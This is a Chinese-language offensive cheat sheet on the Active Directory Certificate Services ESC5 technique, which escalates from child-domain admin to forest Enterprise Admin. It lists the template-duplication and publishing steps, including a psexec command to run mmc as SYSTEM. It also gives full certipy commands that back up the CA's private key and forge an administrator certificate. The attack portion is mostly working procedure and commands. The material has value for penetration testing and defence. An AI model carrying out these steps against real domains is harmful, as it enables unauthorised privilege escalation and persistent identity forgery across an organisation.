# Active Directory - 证书 ESC5

## ESC5 - PKI 对象访问控制漏洞

> 将权限从子域的**域管理员**提升到林根的**企业管理员**。

**前提条件**：

* 能够向"证书模板"容器添加新模板
* 对 `pKIEnrollmentService` 对象拥有"写入"权限

**利用方法 - 访问控制**：

* 使用 `PsExec` 在子域 DC 上以 SYSTEM 身份启动 `mmc`：`psexec.exe /accepteula -i -s mmc`
* 连接到"配置命名上下文" > "证书模板"容器
* 以 SYSTEM 身份打开 `certsrv.msc` 并复制一个现有模板
* 编辑模板属性以：
    * 授予子域中我们控制的主体注册权限。
    * 在应用程序策略中包含客户端身份验证。
    * 在证书请求中允许 SAN。
    * 不启用管理器审批或授权签名。
* 将证书模板发布到 CA
    * 通过将模板添加到 `CN=Services`>`CN=Public Key Services`>`CN=Enrollment Services`>`pkiEnrollmentService` 的 `certificateTemplate` 属性列表中来发布
* 最后利用复制模板中引入的 ESC1 漏洞，颁发模拟企业管理员的证书。

**利用方法 - 黄金证书**：

使用 `certipy` 提取 CA 证书和私钥

```ps1
certipy ca -backup -u user@domain.local -p password -dc-ip 10.10.10.10 -ca 'DOMAIN-CA' -target 10.10.10.11 -debug
```

然后伪造域管理员证书

```ps1
certipy forge -ca-pfx 'DOMAIN-CA.pfx' -upn administrator@domain.local
```

## 参考资料

* [From DA to EA with ESC5 - Andy Robbins - May 16, 2023](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
